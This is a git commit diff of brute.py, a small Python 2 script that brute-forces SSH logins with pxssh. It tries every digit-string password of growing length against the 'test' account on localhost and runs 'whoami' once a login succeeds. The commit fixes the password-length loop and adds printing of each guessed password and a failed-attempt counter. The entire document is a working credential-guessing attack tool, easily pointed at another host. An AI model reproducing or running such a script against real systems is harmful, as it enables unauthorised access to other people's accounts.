42d0f83e5292b5000ecf655e3bb0bec14d522a35
Rohit Geetha Bal <31119410+rohitgbal@users.noreply.github.com>
2018-03-26 11:46:31 +0545

    Issue solved regarding 2 character password

--- brute.py
+++ brute.py
@@ -3,20 +3,22 @@ from itertools import product
 import string, itertools, time
 from pexpect import pxssh
 import getpass
+count=0;
 hostname = 'localhost'
 username = 'test'
 characters = digits
 
 def iter_all_strings():
-    length = 0
+    length = 1
     while True:
         for s in itertools.product(characters, repeat=length):
             yield ''.join((s))
-            length +=1
+    	length = length+1
 
 for password in iter_all_strings():
 	try:
 		s = pxssh.pxssh()
+		print password
 		s.login (hostname, username, password)
 		s.sendline('whoami')
 		s.prompt()
@@ -24,6 +26,7 @@ for password in iter_all_strings():
 		s.logout()
 		break;
 	except pxssh.ExceptionPxssh, e:
-		print "pxssh failed on login."
+		count= count+1
+		print "Failed login Attempt = ",count, "Reason : ",
 		print str(e)
     
